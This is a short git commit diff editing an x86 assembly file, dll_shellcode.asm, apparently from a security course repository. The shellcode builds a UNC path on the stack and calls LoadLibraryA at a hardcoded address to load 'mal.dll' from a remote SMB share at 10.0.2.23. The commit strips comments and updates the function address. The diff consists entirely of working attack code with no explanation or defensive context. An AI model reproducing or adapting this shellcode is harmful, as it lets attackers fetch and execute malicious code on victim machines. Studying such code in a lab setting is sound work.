b044745ac9a42026cadc06e904ee65e671f69d8c
Xinwen Fu <69218457+xinwenfu@users.noreply.github.com>
2025-06-09 11:46:26 -0400

    Add files via upload

--- SourceCode/dll_shellcode.asm
+++ SourceCode/dll_shellcode.asm
@@ -1,9 +1,3 @@
-; filename: shellcode.asm
-; section .text
-; global _start
-
-; _start:
-
 sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
                         ; overwriting our shellcode
 xor ebx,ebx             ; Zero out EBX that will be the NULL byte terminating
@@ -16,9 +10,6 @@ push 0x5c33322e
 push 0x322e302e         
 push 0x30315c5c         
 
-
 push esp                ; Push pointer of the UNC path
-mov ebx,0x75cb0fb0
-call ebx
-mov ebx,0x75cb0dc0      ; Move into EBX the address of 'LoadLibraryA'
+mov ebx,0x76470dc0      ; Move into EBX the address of 'LoadLibraryA'
 call ebx                ; call 'LoadLibraryA("\\10.0.2.23\abcd\mal.dll")'
